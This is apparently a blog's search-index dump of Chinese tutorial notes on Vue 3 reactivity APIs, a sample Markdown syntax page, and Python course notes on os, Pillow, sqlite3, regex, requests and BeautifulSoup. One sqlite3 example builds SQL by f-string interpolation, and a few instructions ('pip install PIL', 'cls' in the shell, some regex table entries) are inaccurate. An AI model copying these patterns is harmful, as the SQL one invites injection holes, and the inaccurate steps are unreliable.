14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 import { ref, reactive, toRefs, readonly, shallowReadonly} from \u0026#34;vue\u0026#34; export default { setup() { let sum = ref(0) let person = reactive({ name: \u0026#34;張三\u0026#34;, age: 18, job: { job1: { salary: 20 } } }) // 將 sum 變為唯讀，保護數據不被修改 sum = readonly(sum) // 將 person 的所有屬性變為唯讀，保護所有屬性數據不被修改 person = readonly(person) // 將 person 的\u0026#34;第一層屬性數據\u0026#34;變為唯讀(name、age無法修改，但 job 可以) person = shallowReadonly(person) return { sum, ...toRefs(person) } } } toRaw 與 markRaw raw：原始。 toRaw： 作用：將一個由 reactive 生成的響應式對象轉為普通對象。 應用場景：用於讀取響應式對象對應的普通對象，對這個普通對象的所有操作，不會引起頁面更新。 markRaw： 作用：標記一個對象，使其永遠不會再成為響應式對象。 應用場景： 有些值不應被設置為響應式的，例如複雜的第三方類庫等。 當渲染具有不可變數據源的大列表時，跳過響應式轉換可以提高性能。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 import { ref, reactive, toRaw, markRaw} from \u0026#34;vue\u0026#34; export default { setup() { let sum = ref(0) let person = reactive({ name: \u0026#34;張三\u0026#34;, age: 18, job: { job1: { salary: 20 } } }) function showRawPerson() { const p = toRaw(person) console.log(p) // 返回的不再是 Proxy，而是 Object } function addCar() { let car = { name: \u0026#34;奔馳\u0026#34;, price: 40} person.car = markRaw(car) // 標記 person.car 不是響應式的數據(數據依舊可修改，但畫面不會變) } return { sum, ...toRefs(person), showRawPerson, addCar } } } customRef 作用：創建一個自定義的 ref，並對其依賴項跟蹤和更新觸發進行顯示控制。 實現防抖效果： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 \u0026lt;template\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; v-model=\u0026#34;keyWord\u0026#34; /\u0026gt; \u0026lt;h3\u0026gt; {{ keyWord }} \u0026lt;/h3\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; import { ref, customRef } from \u0026#34;vue\u0026#34; export default { setup() { // 使用 vue 提供的 ref // let keyWord = ref(\u0026#34;hello\u0026#34;) // 自定義的一個 ref function myRef(value, delay) { let timer return customRef((track, trigger) =\u0026gt; { return { get() { console.log(`有人從 myRef 這個容器中讀取數據了，我把${value}給他了`) track() // 通知 Vue 追蹤數據的變化(提前與 get 商量一下，讓它認為這個 value 是有用的) return value }, set(newValue) { console.log(`有人把 myRef 這個容器中的數據改為了${newValue}`) clearTimeout(timer) timer = setTimeout(() =\u0026gt; { value = newValue trigger() // 通知 Vue 去重新解析模板，以便觸發 get }, delay) } } }) } // 使用自定義的防抖 ref let keyWord = myRef(\u0026#34;hello\u0026#34;, 500) return { keyWord } } } \u0026lt;/script\u0026gt; provide 與 inject 作用：實現祖孫組件間通信。 套路：父組件有一個 provide 選項來提供數據，後代組件有一個 inject 選項來開始使用這些數據。 具體寫法： 1. 祖組件中： 1 2 3 4 5 6 7 8 9 10 11 12 import { reactive, toRefs, provide } from \u0026#34;vue\u0026#34; export default { name: \u0026#34;App\u0026#34;, setup() { let car = reactive({ name: \u0026#34;奔馳\u0026#34;, price: \u0026#34;40W\u0026#34; }) provide(\u0026#34;car\u0026#34;, car) // 給自己的後代組件傳遞數據 return { ...toRefs(car) } } } 2. 後代組件中： 1 2 3 4 5 6 7 8 9 import { inject } from \u0026#34;vue\u0026#34; export default { name: \u0026#34;Son\u0026#34;, setup() { let car = inject(\u0026#34;car\u0026#34;) console.log(car) return { car } } } 響應式數據的判斷 isRef：檢查一個值是否為一個 ref 對象。 isReactive：檢查一個對象是否是由 reactive 創建的響應式代理。 isReadonly：檢查一個對象是否是由 readonly 創建的唯讀代理。 isProxy：檢查一個對象是否是由 reactive 或是 readonly 方法創建的代理。 Teleport teleport：傳送、瞬間移動。 作用：能夠將我們的 組件 html 結構 移動到指定的位置。 具體寫法： 1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;teleport to=\u0026#34;body\u0026#34;\u0026gt; \u0026lt;!-- to 也能寫 css select，例如 to=\u0026#34;#app\u0026#34; --\u0026gt; \u0026lt;div v-if=\u0026#34;isShow\u0026#34; class=\u0026#34;mask\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;dialog\u0026#34;\u0026gt; \u0026lt;h3\u0026gt; 我是一個彈窗 \u0026lt;/h3\u0026gt; \u0026lt;button @click=\u0026#34;isShow = false\u0026#34;\u0026gt; 關閉彈窗 \u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/teleport\u0026gt; Suspense suspense：懸疑、懸而未決的。 作用：等待異步組件時，渲染一些額外內容，讓使用者有更好的用戶體驗。 使用步驟： 異步引用組件 1 2 import { defineAsyncComponent } from \u0026#34;vue\u0026#34; // 宣告異步組件時使用 const Child = defineAsyncComponent(() =\u0026gt;. import (\u0026#34;./components/Child.vue\u0026#34;)) 使用 Suspense 包裹組件，並配置好 default 與 fallback 1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;template\u0026gt; \u0026lt;div id=\u0026#34;app\u0026#34;\u0026gt; \u0026lt;h3\u0026gt;我是App組件\u0026lt;/h3\u0026gt; \u0026lt;Suspense\u0026gt; \u0026lt;template v-slot:default\u0026gt; \u0026lt;Child /\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;template v-slot:fallback\u0026gt; \u0026lt;h3\u0026gt;加載中......\u0026lt;/h3\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;/Suspense\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; 全局 API 的轉移 Vue 2.0 有許多全局 API 和配置。 例如：註冊全局組件、註冊全局指令等。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 // 註冊全局組件 Vue.component(\u0026#34;MyButton\u0026#34;, { data() { return { count: 0 } }, template: \u0026#34;\u0026lt;button @click=\u0026#39;count++\u0026#39;\u0026gt;Clicked {{ count }}\u0026lt;/button\u0026gt;\u0026#34; }) // 註冊全局指令 Vue.directive(\u0026#34;focus\u0026#34;, { inserted: el =\u0026gt; el.focus() }) Vue 3.0 中對這些 API 做出了調整： 將全局的 API，即： Vue.xxx 調整到應用實例(app)上 2.0 全局 API(Vue) 3.0 實例 API(app) Vue.config.xxxx app.config.xxxx Vue.config.productionTip 移除 Vue.component app.component Vue.directive app.directive Vue.mixin app.mixin Vue.use app.use Vue.prototype app.config.globalProperties ","date":"2022-07-17T00:00:00Z","image":"https://wayneblog.ga/2022-07-17/atguigu-vue3-note/index_huc185496ed55e6f95ddd80689badb475a_232407_120x120_fill_q75_box_smart1.jpeg","permalink":"https://wayneblog.ga/2022-07-17/atguigu-vue3-note/","title":"尚硅谷 Vue3 視頻筆記"},{"content":"Markdown 是讓你快速撰寫筆記，流暢管理知識，支援多種衍生功能的生產力工具\n標題 當您想要將一段文字標示為標題的時候，請使用這個語法。\n請在行首輸入 # 符號，並在後面加上一個空白後，再輸入標題文字。\n標題有分成 6 個層級，# 的數量愈多，層級越低。\n1 2 3 4 5 6 # 第一層級標題 h1 ## 第二層級標題 h2 ### 第三層級標題 h3 #### 第四層級標題 h4 ##### 第五層級標題 h5 ###### 第六層級標題 h6 Paragraph Xerum, quo qui aut unt expliquam qui dolut labo. Aque venitatiusda cum, voluptionse latur sitiae dolessi aut parist aut dollo enim qui voluptate ma dolestendit peritin re plis aut quas inctum laceat est volestemque commosa as cus endigna tectur, offic to cor sequas etum rerum idem sintibus eiur? Quianimin porecus evelectur, cum que nis nust voloribus ratem aut omnimi, sitatur? Quiatem. Nam, omnis sum am facea corem alique molestrunt et eos evelece arcillit ut aut eos eos nus, sin conecerem erum fuga. Ri oditatquam, ad quibus unda veliamenimin cusam et facea ipsamus es exerum sitate dolores editium rerore eost, temped molorro ratiae volorro te reribus dolorer sperchicium faceata tiustia prat.\nItatur? Quiatae cullecum rem ent aut odis in re eossequodi nonsequ idebis ne sapicia is sinveli squiatum, core et que aut hariosam ex eat.\nBlockquotes The blockquote element represents content that is quoted from another source, optionally with a citation which must be within a footer or cite element, and optionally with in-line changes such as annotations and abbreviations.\nBlockquote without attribution Tiam, ad mint andaepu dandae nostion secatur sequo quae. Note that you can use Markdown syntax within a blockquote.\nBlockquote with attribution Don\u0026rsquo;t communicate by sharing memory, share memory by communicating.\n— Rob Pike1\nTables Tables aren\u0026rsquo;t part of the core Markdown spec, but Hugo supports supports them out-of-the-box.\nName Age Bob 27 Alice 23 Inline Markdown within tables Italics Bold Code italics bold code A B C D E F Lorem ipsum dolor sit amet, consectetur adipiscing elit. Phasellus ultricies, sapien non euismod aliquam, dui ligula tincidunt odio, at accumsan nulla sapien eget ex. Proin eleifend dictum ipsum, non euismod ipsum pulvinar et. Vivamus sollicitudin, quam in pulvinar aliquam, metus elit pretium purus Proin sit amet velit nec enim imperdiet vehicula. Ut bibendum vestibulum quam, eu egestas turpis gravida nec Sed scelerisque nec turpis vel viverra. Vivamus vitae pretium sapien Code Blocks Code block with backticks 1 2 3 4 5 6 7 8 9 10 \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Code block indented with four spaces \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026quot;en\u0026quot;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026quot;utf-8\u0026quot;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Code block with Hugo\u0026rsquo;s internal highlight shortcode 1 2 3 4 5 6 7 8 9 10 \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Diff code block 1 2 3 4 5 [dependencies.bevy] git = \u0026#34;https://github.com/bevyengine/bevy\u0026#34; rev = \u0026#34;11f52b8c72fc3a568e8bb4a4cd1f3eb025ac2e13\u0026#34; - features = [\u0026#34;dynamic\u0026#34;] + features = [\u0026#34;jpeg\u0026#34;, \u0026#34;dynamic\u0026#34;] List Types Ordered List First item Second item Third item Unordered List List item Another item And another item Nested list Fruit Apple Orange Banana Dairy Milk Cheese Other Elements — abbr, sub, sup, kbd, mark GIF is a bitmap image format.\nH2O\nXn + Yn = Zn\nPress CTRL+ALT+Delete to end the session.\nMost salamanders are nocturnal, and hunt for insects, worms, and other small creatures.\nHyperlinked image The above quote is excerpted from Rob Pike\u0026rsquo;s talk during Gopherfest, November 18, 2015.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","date":"2022-07-16T00:00:00Z","image":"https://wayneblog.ga/2022-07-16/markdown-syntax/pawel-czerwinski-8uZPynIu-rQ-unsplash_hud7e36f7e20e71be184458283bdae4646_55974_120x120_fill_q75_box_smart1.jpg","permalink":"https://wayneblog.ga/2022-07-16/markdown-syntax/","title":"Markdown 語法指南"},{"content":" 指導教師：李菊權(0921-763623) python(版本3.8.2) 安裝至環境變數(Windows10) Add Python 3.8 to PATH 若沒勾選，需自行到(以下兩種方式進入環境變數設定)\n本機 ▸ 內容 控制台 ▸ 系統及安全性 ▸ 系統\n進階系統設定 ▸ 系統內容 ▸ 進階 ▸ 環境變數\n將python.exe目錄新增至環境變數\n(PATH ▸ 編輯 ▸ 新增) 1 2 3 4 5 6 7 8 9 ### python.exe預設位置(Windows10) C:\\Users\\user\\AppData\\Local\\Programs\\Python\\Python38-32\\ ### 找python.exe(Windows10) where python.exe \u0026gt; C:\\Users\\user\\AppData\\Local\\Programs\\Python\\Python38-32\\python.exe ### 將以下此段路徑新增至環境變數 ### C:\\Users\\user\\AppData\\Local\\Programs\\Python\\Python38-32\\ Python介紹 Python 動態型別(強型別)/直譯式語言 動態型別：使用變數時不須預先宣告型別，依照設定之值而變。 強型別：不同型別無法進行運算。 直譯式語言：不須經過編譯即可直接執行。 副檔名：.py IDLE python官方提供的IDE 推薦開發環境 Anaconda Spyder - 整合開發程式 Python Shell (REPL) Python Shell (REPL) 模式\n進入Python Shell (REPL) 1 2 python \u0026gt;\u0026gt;\u0026gt; # 開頭變成\u0026gt;\u0026gt;\u0026gt;代表進入python shell 離開Python Shell (REPL) 1 quit() 清除當前Python Shell Screen 1 cls Python Plugin 作業系統模組 - os 載入模組 1 import os # 匯入系統模組 打開系統的指定程式 - os.system(程式名) 1 2 os.system(\u0026#34;mspaint\u0026#34;) # 打開小畫家 os.system(\u0026#34;calc\u0026#34;) # 打開計算機 列出目錄中所有檔案 - os.listdir(路徑) 1 os.listdir(\u0026#34;./\u0026#34;) # 當前目錄 取得當前目錄 - os.getcwd() 1 os.getcwd() 檢查目錄是否存在 - os.path.isdir(目錄路徑) 1 2 3 4 5 6 # 檢查當前位置是否存在export目錄 testDir = os.getcwd() + \u0026#34;\\\\export\u0026#34; if os.path.isdir(testDir): print(\u0026#34;exist\u0026#34;) else: print(\u0026#34;not exist\u0026#34;) 檢查檔案是否存在 - os.path.isfile(檔案路徑) 1 2 3 4 5 6 # 檢查當前位置是否存在text.txt testFile = os.getcwd() + \u0026#34;\\\\test.txt\u0026#34; if os.path.isfile(testFile): print(\u0026#34;exist\u0026#34;) else: print(\u0026#34;not exist\u0026#34;) 檢查路徑是否存在 - os.path.exists(目錄路徑) 1 2 3 4 5 testPath = \u0026#34;\\\\etc\\\\hosts\u0026#34; if os.path.exists(testPath): print(\u0026#34;exist\u0026#34;) else: print(\u0026#34;not exist\u0026#34;) 於指定路徑建立目錄 - os.mkdir(路徑+目錄名) 1 2 3 4 # 檢查當前目錄是否存在export目錄，沒有則建立 new_dir = os.getcwd() + \u0026#34;\\\\export\u0026#34; if os.path.isdir(new_dir) != True: os.mkdir(new_dir) 影像處理模組 - PIL(Pillow) 安裝 PIL 模組 1 2 ### 使用 pip 安裝 PIL 模組 pip install PIL 載入模組 1 from PIL import Image 打開圖檔 - .open(圖檔路徑) 1 im = Image.open(\u0026#34;test.jpg\u0026#34;) 存檔 - .save(\u0026quot;檔名\u0026quot;, \u0026ldquo;[格式]\u0026rdquo;, [quality = 壓縮值(通常設定80或90)], [subsampling = 0]) 1 2 3 4 5 im = Image.open(\u0026#34;test.jpg\u0026#34;) # 打開圖檔 im.save(\u0026#34;test1.png\u0026#34;) # 轉存成png # 轉存成png並壓縮品質:80 im.save(\u0026#34;test2.png\u0026#34;, quality = 80, subsampling = 0) PIL常用的圖檔格式\n格式 BMP、EPS、GIF、JPEG、JPG、PNG、TIFF、PDF 調整圖片尺寸 - .resize((寬, 高) [, filter(濾波)設定]) 不會自動等比例縮放，需等比例縮放得自行計算比例。\n1 2 3 4 5 6 im = Image.open(\u0026#34;test.jpg\u0026#34;) # 載入圖片 width = 400 # 指定寬度為 400px ratio = float(width)/im.size[0] # 計算長寬比 height = int(im.size[1]*ratio) # 高度依長寬比計算並調整 nim = im.resize((width, height), Image.BILINEAR) nim.save(\u0026#34;test_resized.jpg\u0026#34;) # 另存調整尺寸後的圖檔 濾波設定值\nfilter(濾波) 說明 NEAREST 預設濾波，從輸入的圖檔中選取最近的像素作為輸出像素。 BILINEAR 雙線性內插濾波，再輸入圖像的 2*2 矩陣上進行線性插值。 BICUBIC 雙立方濾波，再輸入圖像的 4*4 矩陣上進行立方插值。 ANTIALIAS 平滑濾波，對所有可以影響輸出像素的輸入像素進行高質量的重採樣濾波，以計算輸出像素值。 圖像繪製工具 - turtle 1 2 3 4 5 6 7 8 9 import turtle # 匯入圖像繪製工具turtle turtle.showturtle() # 打開turtle turtle.forward(100) # turtle往前100 turtle.left(90) # 左轉90度 turtle.circle(30) # 畫半徑30的圓 turtle.reset() # 重新設定 turtle.goto(30,50) # 移動到指定座標 turtle.penup() # 將筆提起 turtle.pendown() # 將筆放下 數字模組 - math 1 2 3 4 5 6 7 8 9 10 11 import math print(math.pi) # 取圓周率 \u0026gt;\u0026gt;\u0026gt; 3.141592653589793 print(math.radians(45)) # 取弧度45度 \u0026gt;\u0026gt;\u0026gt; 0.7853981633974483 print(math.sin(math.radians(45))) # 取sin(45度) \u0026gt;\u0026gt;\u0026gt; 0.7071067811865476 print(math.factorial(5)) # 取階乘(5為1*2*3*4*5) \u0026gt;\u0026gt;\u0026gt; 120 print(math.gcd(27, 9)) # 取最大公因數 \u0026gt;\u0026gt;\u0026gt; 9 亂數模組 - random 1 2 3 4 5 6 7 8 9 10 11 12 import random random.random() # 取0~1的隨機數 \u0026gt;\u0026gt;\u0026gt; 0.5672829418362756 random.randint(1, 10) # 取1~10的隨機數 \u0026gt;\u0026gt;\u0026gt; 4 K = [2,6,9,8,14,20,30] # 先設定一個陣列 random.shuffle(K) # 打亂陣列排列(直接操作該陣列) print(K) \u0026gt;\u0026gt;\u0026gt; [30, 9, 2, 6, 14, 20, 8] 浮點數精度模組 - Decimal 1 2 3 4 5 6 7 print(0.1+0.1+0.1) \u0026gt;\u0026gt;\u0026gt; 0.30000000000000004 # 使用Decimal模組來避免浮點數精度問題 from decimal import Decimal print(Decimal(\u0026#34;0.1\u0026#34;)*3) \u0026gt;\u0026gt;\u0026gt; 0.3 抓DOS模式後方參數的模組 - sys 1 2 3 # sysArgv.py import sys print(sys.argv) 1 2 3 # 於DOS模式執行sysArgv.py並於後方帶參數A、B、C python sysArgv.py A B C \u0026gt;\u0026gt;\u0026gt; [\u0026#39;sysArgv.py\u0026#39;, \u0026#39;A\u0026#39;, \u0026#39;B\u0026#39;, \u0026#39;C\u0026#39;] 資料庫模組 - sqlite3 載入模組 1 import sqlite3 連接資料庫 - .connect() 資料庫連結.connect(資料庫名稱) 1 2 import sqlite3 conn = sqlite3.connect(\u0026#34;test.sqlite\u0026#34;) Cursor指標指到資料庫(以便使用資料庫物件操作資料庫) - .cursor() 資料庫物件 = 資料庫連結.cursor() 1 2 3 import sqlite3 conn = sqlite3.connect(\u0026#34;test.sqlite\u0026#34;) cursor = conn.cursor() 執行SQL語法 - .execute() 資料庫物件.execute(SQL語法) 1 2 3 4 5 6 7 8 9 10 11 12 import sqlite3 conn = sqlite3.connect(\u0026#34;test.sqlite\u0026#34;) cursor = conn.cursor() SQL = \u0026#34;CREATE TABLE IF NOT EXISTS UserScore(\u0026#39;Name\u0026#39; Text, \u0026#39;Score\u0026#39; Integer)\u0026#34; cursor.execute(SQL) # 使用變數 name = \u0026#39;Wayne\u0026#39; Score = 80 SQL = f\u0026#34;INSERT INTO UserScore VALUES(\u0026#39;{name}\u0026#39;, {Score})\u0026#34; cursor.execute(SQL) 提交當前的SQL事務(執行完SQL需使用此函式提交) - .commit() 資料庫連結.commit() 1 2 conn.commit() conn.close() 取得所有資料 - .fetchall() 資料庫物件.fetchall() 1 2 3 4 5 6 7 8 9 10 import sqlite3 conn = sqlite3.connect(\u0026#34;test042601.sqlite3\u0026#34;) cursor = conn.cursor() SQL = \u0026#39;SELECT * FROM UserData;\u0026#39; cursor.execute(SQL) rows = cursor.fetchall() for row in rows: # format格式化資料型態 print(\u0026#34;{}\\t{}\\t{}\u0026#34;.format(row[0], row[1], row[2])) 取得單筆資料 - .fetchone() 資料庫物件.fetchone() 1 2 3 4 5 6 7 8 9 import sqlite3 conn = sqlite3.connect(\u0026#34;test042601.sqlite3\u0026#34;) cursor = conn.cursor() SQL = \u0026#39;SELECT * FROM UserData;\u0026#39; cursor.execute(SQL) line = cursor.fetchone() if not line == None: print(\u0026#34;{}\\t{}\\t{}\u0026#34;.format(line[0], line[1], line[2])) 正規表達式模組 - re 以小寫r開頭再接字串，例如：r\u0026quot;\\d\u0026quot;、r\u0026quot;0-9\u0026quot; 規則寫法 說明 範例 {} 個數 \\d{4}-\\d{6}：台灣電話號碼格式0000-000000為符合 {n,} 至少出現n次 X{2,}：X至少出現2次才符合 ` ` 或 \\d 任意數字 \\d：0-9為符合 - 到 1-5：1 ~ 5為符合,a-z：a ~ z為符合 ^ 否定 ^aeiou：非a,e,i,o,u為符合 . 字元 .：字元皆符合,符號類(例如：\\n)不符合 * 重複前一個字元0~無限多次都符合 err*：err、errr、errrr\u0026hellip;等都為符合 ? 前一個字元可有可無皆符合 colou?r：color、colour皆為符合 + 前一個字元要一次以上才符合 er+：er不符合,err、errr\u0026hellip;等才符合 $ 1.位數由後往前匹配 2.為結尾才匹配 [1-9]\\d$：1 ~ 99皆為符合,100不符合 () 1.僅收集括號內的內容 2.分組別以便.group(組別)可以直接抓到值 r'\u0026lt;h3 class=\u0026quot;LC20lb DKV0Md\u0026quot;\u0026gt;(.*?)\u0026lt;/h3\u0026gt;'：僅回傳\u0026lt;h3\u0026gt;內的文字 \\b 邊界,為邊界則符合 dog\\b：\u0026lsquo;dog \u0026lsquo;符合,\u0026lsquo;dog\u0026rsquo;不符合 \\數字 分組向前參考 貪婪/逐步量詞 (*/?) 貪婪量詞 - *:0次~無限次皆符合。 1 2 3 re.match(r\u0026#34;\u0026lt;.*\u0026gt;\u0026#34;, \u0026#34;\u0026lt;h3\u0026gt;大家好\u0026lt;/h3\u0026gt;\u0026#34;) \u0026gt;\u0026gt;\u0026gt; \u0026lt;h3\u0026gt;大家好\u0026lt;/h3\u0026gt; 逐步量詞 - ?:回傳最短的量詞。 1 2 3 re.match(r\u0026#34;\u0026lt;.*?\u0026gt;\u0026#34;, \u0026#34;\u0026lt;h3\u0026gt;大家好\u0026lt;/h3\u0026gt;\u0026#34;) \u0026gt;\u0026gt;\u0026gt; \u0026lt;h3\u0026gt; 載入模組 1 import re 分割字串 - re.split(正則, 分割的字串) 1 2 3 print(re.split(\u0026#39;\\d\u0026#39;, \u0026#34;Andy1Ben2Cathy\u0026#34;)) \u0026gt;\u0026gt;\u0026gt; [\u0026#39;Andy\u0026#39;, \u0026#39;Ben\u0026#39;, \u0026#39;Cathy\u0026#39;] 取代字元 - re.sub(正則, 欲取代的字元, 字串) 1 2 3 re.sub(\u0026#34;\\d\u0026#34;, \u0026#34;-\u0026#34;, \u0026#34;Andy1Ben2Cathy\u0026#34;) \u0026gt;\u0026gt;\u0026gt; \u0026#39;Andy-Ben-Cathy\u0026#39; 匹配字元 - re.match(欲匹配的文字, 字串) 1 2 3 re.match(\u0026#34;yahoo\u0026#34;, \u0026#34;yahoo.com.tw\u0026#34;) \u0026gt;\u0026gt;\u0026gt; \u0026lt;re.Match object; span=(0, 5), match=\u0026#39;yahoo\u0026#39;\u0026gt; 尋找字元(找第一個) - re.search(欲尋找的文字, 字串) 1 2 3 re.search(\u0026#34;yahoo\u0026#34;, \u0026#34;yahoo.com.tw\u0026#34;) \u0026gt;\u0026gt;\u0026gt; \u0026lt;re.Match object; span=(0, 5), match=\u0026#39;yahoo\u0026#39;\u0026gt; 尋找字元(找所有) - re.findall(欲尋找的文字, 字串) 1 2 3 re.findall(\u0026#39;\\d{4}-\\d{6}\u0026#39;, \u0026#34;jjladpoiwlkj 0800-123456 hjkpojas 0921-456873\u0026#34;) \u0026gt;\u0026gt;\u0026gt; [\u0026#39;0800-123456\u0026#39;, \u0026#39;0921-456873\u0026#39;] 抓html模組 - requests 載入模組 1 import requests GET 抓取檔案 - .get(網址) 1 response = requests.get(\u0026#34;https://www.baidu.com/\u0026#34;) GET 可帶的參數(需使用關鍵字參數) 說明 headers 請求的headers params 參數 cookies client的cookies 抓取標頭(head) - .head(網址) 1 2 # .head() -\u0026gt; 只抓標頭 reshead = requests.head(\u0026#34;https://www.baidu.com/\u0026#34;) 狀態碼 - status_code 1 2 3 print(response.status_code) \u0026gt;\u0026gt;\u0026gt; 200 # 200為正常連線 編碼格式 - encoding 1 2 3 4 5 print(response.encoding) \u0026gt;\u0026gt;\u0026gt; \u0026#39;ISO-8859-1\u0026#39; # 轉編碼為utf-8 response.encoding = \u0026#34;utf-8\u0026#34; html內容 - text 1 2 3 print(response.text) \u0026gt;\u0026gt;\u0026gt; \u0026#39;\u0026lt;!DOCTYPE html\u0026gt;\\r\\n\u0026lt;!--STATUS OK--\u0026gt;\u0026lt;html\u0026gt;...\u0026#39; response headers - headers 1 2 3 print(response.headers) \u0026gt;\u0026gt;\u0026gt; {\u0026#39;Server\u0026#39;: \u0026#39;Baby Web Server\u0026#39;, \u0026#39;Content-Type\u0026#39;: \u0026#39;text/html\u0026#39;, \u0026#39;Content-Length\u0026#39;: \u0026#39;467\u0026#39;, \u0026#39;Set-Cookie\u0026#39;: \u0026#39;SESSIONID=00000006; path=/;version=1\u0026#39;, \u0026#39;Date\u0026#39;: \u0026#39;Sun, 03 May 2020 10:41:58 GMT\u0026#39;} request headers - request.headers 其中的User-Agent相當重要，用來判斷使用者的相關資訊用，爬蟲與反爬蟲通常使用此參數。 1 2 3 print(response.request.headers) \u0026gt;\u0026gt;\u0026gt; {\u0026#39;User-Agent\u0026#39;: \u0026#39;python-requests/2.22.0\u0026#39;, \u0026#39;Accept-Encoding\u0026#39;: \u0026#39;gzip, deflate\u0026#39;, \u0026#39;Accept\u0026#39;: \u0026#39;*/*\u0026#39;, \u0026#39;Connection\u0026#39;: \u0026#39;keep-alive\u0026#39;} 抓圖片檔 開檔格式使用wb:二進位格式寫入 w:寫入 / b:二進位格式 1 2 3 4 5 6 7 8 import requests res = requests.get(\u0026#34;https://www.natgeomedia.com/userfiles/PhotoContest/771/sm1100/2019091450912553.jpg\u0026#34;) photo = res.content # w:寫入/b:二進位格式 \u0026#34;wb\u0026#34; =\u0026gt; 二進位格式寫入 with open(\u0026#34;img01.jpg\u0026#34;, \u0026#34;wb\u0026#34;) as file: file.write(photo) 帶request header的請求 先從一般瀏覽器取得header(user-agent) 需使用關鍵字參數 1 2 3 4 5 # 從瀏覽器的開發者工具取得正常的request headers資料 headers = {\u0026#34;user-agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\u0026#34;} # 在後方帶入關鍵字參數headers res = requests.get(\u0026#34;http://google.com.tw\u0026#34;, headers = headers) POST POST 可帶的參數(需使用關鍵字參數) 說明 data form data請求的data headers 請求的headers cookies client的cookies POST存Session - .Session() 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 data = { \u0026#34;from\u0026#34;: \u0026#34;/bbs/Gossiping/index.html\u0026#34;, \u0026#34;yes\u0026#34;: \u0026#34;yes\u0026#34; } headers = { \u0026#34;user-agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\u0026#34; } # 先使用POST取得滿18歲的驗證並存放置session內 rs = requests.Session() rs.post(\u0026#34;https://www.ptt.cc/ask/over18\u0026#34;, data = data, headers = headers) # 過滿18歲的驗證後使用get取得網頁內容 response = rs.get(\u0026#34;https://www.ptt.cc/bbs/Gossiping/index.html\u0026#34;, headers = headers) 解析\u0026amp;美化HTML模組 - BeautifulSoup4 載入模組 1 from bs4 import BeautifulSoup BeautifulSoup4的基本元素表 基本元素 說明 tag 標籤：最基本的信息組織單位，分別用\u0026lt;\u0026gt;和\u0026lt;/\u0026gt;標明開頭與結尾。 name 標籤名稱：\u0026lt;p\u0026gt;...\u0026lt;/p\u0026gt;的名字是p，格式：\u0026lt;tag\u0026gt;.name。 Attributes 屬性：\u0026lt;tag\u0026gt;.attrs，dict型式。 NavigatString 內容：\u0026lt;tag\u0026gt;.string。 Comment 註釋：標籤內字符串的註釋部分，一種特殊的Comment類型。 解析 - .BeautifulSoup(html, \u0026lsquo;html.parser\u0026rsquo;) 1 2 3 4 5 6 7 8 9 10 demo = \u0026#34;\u0026#34;\u0026#34; \u0026lt;html\u0026gt;\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;This is a python demo page\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p class=\u0026#34;title\u0026#34;\u0026gt;\u0026lt;b\u0026gt;The demo python introduces several python courses.\u0026lt;/b\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;p class=\u0026#34;course\u0026#34;\u0026gt;Python is a wonderful general-purpose programming language. You can learn Python from novice to professional by tracking the following courses: \u0026lt;a href=\u0026#34;http://www.icourse163.org/course/BIT-268001\u0026#34; class=\u0026#34;py1\u0026#34; id=\u0026#34;link1\u0026#34;\u0026gt;Basic Python\u0026lt;/a\u0026gt; and \u0026lt;a href=\u0026#34;http://www.icourse163.org/course/BIT-1001870001\u0026#34; class=\u0026#34;py2\u0026#34; id=\u0026#34;link2\u0026#34;\u0026gt;Advanced Python\u0026lt;/a\u0026gt;.\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; \u0026#34;\u0026#34;\u0026#34; soup = BeautifulSoup(demo, \u0026#39;html.parser\u0026#39;) 美化 - .prettify() 